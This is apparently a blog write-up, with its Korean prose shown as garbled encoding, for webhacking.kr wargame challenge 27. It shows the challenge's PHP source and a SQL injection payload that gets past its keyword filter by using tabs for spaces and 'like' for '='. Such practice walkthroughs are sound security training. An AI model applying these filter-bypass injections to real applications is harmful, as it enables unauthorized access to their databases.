---
title: "[webhacking.kr] 27ë²ˆ ë¬¸ì œ í’€ì´[sql injection]"
categories:
  - webhacking
tags:
  - webhacking.kr
  - wargame
  - sql injection
toc: true
toc_sticky: true
toc_label: "27ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
---

ğŸ’¡ Webhacking.kr challenge(old) 27ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤.
{: .notice--warning}

# ë¬¸ì œ
## ë¬¸ì œ í™”ë©´
  ![image](https://user-images.githubusercontent.com/33647663/151708539-f682bb27-54cb-492b-9bc2-0c3cfb83f886.png)

## ë¬¸ì œ ì†ŒìŠ¤ ì½”ë“œ
  ```php
  <?php
  if($_GET['no']){
  $db = dbconnect();
  if(preg_match("/#|select|\(| |limit|=|0x/i",$_GET['no'])) exit("no hack");
  $r=mysqli_fetch_array(mysqli_query($db,"select id from chall27 where id='guest' and no=({$_GET['no']})")) or die("query error");
  if($r['id']=="guest") echo("guest");
  if($r['id']=="admin") solve(27); // admin's no = 2
}
?>
  ```

  
## ë¬¸ì œ í’€ì´
  **í•„í„°ë§ ë˜ëŠ” ë¬¸ìë“¤**
  | 1 | 2 | 3 | 4 | 5 | 6| 7 |
  |:---:|:---:|:---:|:---:|:---:|:---:|:---:|
  |#|select|(| %20 | limit | = | 0x |


  **sql**
  ```sql
  select id from chall27 where id='guest' and no = ({});
  ```

  í•´ë‹¹ ë¬¸ì œë¥¼ í’€ê¸° ìœ„í•œ 1ì°¨ injection ë¬¸ì„ ì‘ì„±í•˜ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤
  ```md
  4) or no = 2--  
  ```
  ```sql
  select id from chall27 where id='guest' and no = ( 4) or no = 2 -- ) 
  ```

  í•´ë‹¹ injectionë¬¸ì—ì„œ í•„í„°ë§ì„ ìš°íšŒí•˜ê¸° ìœ„í•´ì„œ ë‹¤ìŒê³¼ ê°™ì´ ë°”ê¿”ì¤€ë‹¤.
  1. %20 -> %09
  2. = -> like
  
  ```md
  4)%09or%09no%09like%092--%09
  ```

  í´ë¦¬ì–´ 

  ![image](https://user-images.githubusercontent.com/33647663/151709496-68871636-9f18-488f-bde6-f9f993b2e356.png)

  


